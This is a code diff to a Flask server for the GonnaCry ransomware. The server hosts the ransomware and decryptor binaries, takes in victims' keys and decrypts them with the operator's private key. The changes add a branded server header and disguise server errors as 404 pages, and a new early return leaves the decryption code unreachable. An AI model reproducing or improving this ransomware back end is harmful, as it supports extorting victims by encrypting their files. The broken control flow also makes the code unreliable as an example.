@@ -11,6 +11,8 @@ binaries_path = 'binaries/'
 gonnacry_binary = 'binaries/gonnacry'
 decryptor_binary = 'binaries/decryptor'
 
+headers = {'Server':'GonnaCry WebServer'}
+
 with open("private_key.key") as f:
     private_key = f.read()
 
@@ -21,16 +23,16 @@ app = Flask("gonnacry-web-server")
 
 @app.errorhandler(404)
 def page_not_found(error):
-	return Response("nothing to do here ...")
+	return Response("nothing to do here ...", status=404, headers=headers)
 
 @app.errorhandler(500)
 def page_not_found(error):
-	return Response("Oops I screwed something ...")
+	return Response("nothing to do here ...", status=404, headers=headers)
 
 
 @app.route("/recive-keys/", methods=['POST'])
 def recive_keys():
-    pass
+    return ''
 
 
 @app.route("/download-gonnacry/", methods=["GET"])
@@ -50,14 +52,14 @@ def decrypt():
     try:
         data = base64.b64decode(data)
     except base64.binascii.Error:
-        return Response('Wrong format key. Expected: b64encoded private key!', status=415)
+        return Response('Wrong format key. Expected: b64encoded private key!', status=415, headers=headers)
 
-    return Response(data, status=200)
+    return Response(data, status=200, headers=headers)
     
     try:
         enc = json.loads(data)
     except:
-        return Response('Error in the JSON', status=400)
+        return Response('Error in the JSON', status=400, headers=headers)
 
 
     key = RSA.importKey(private_key)
@@ -68,8 +70,8 @@ def decrypt():
             ciphertext = cipher.decrypt(i)
             decrypted += ciphertext
     except:
-        return Response("Invalid private key!", status=400)
-    return Response(decrypted, status=200)
+        return Response("Invalid private key!", status=400, headers=headers)
+    return Response(decrypted, status=200, headers=headers)
 
 
 @app.route("/")
